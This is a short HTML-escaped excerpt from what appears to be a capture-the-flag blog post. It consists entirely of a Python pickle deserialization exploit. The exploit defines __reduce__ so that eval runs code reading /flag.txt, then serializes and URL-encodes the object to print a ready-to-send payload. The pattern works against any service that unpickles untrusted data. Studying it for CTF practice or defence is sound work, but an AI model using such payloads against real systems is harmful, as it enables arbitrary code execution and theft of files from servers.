&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;网上版本&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; pickle&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; urllib&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;A&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;object&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__reduce__&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;        a = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;open(&amp;#x27;/flag.txt&amp;#x27;,&amp;#x27;r&amp;#x27;).read()&amp;quot;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;,(a,))&lt;br&gt;a = A()&lt;br&gt;test = pickle.dumps(a)&lt;br&gt;payload = urllib.quote(test)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt; payload&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
</content>
        <updated>2019-11-20T14:49:13.000Z</updated>
    </entry>
</feed>
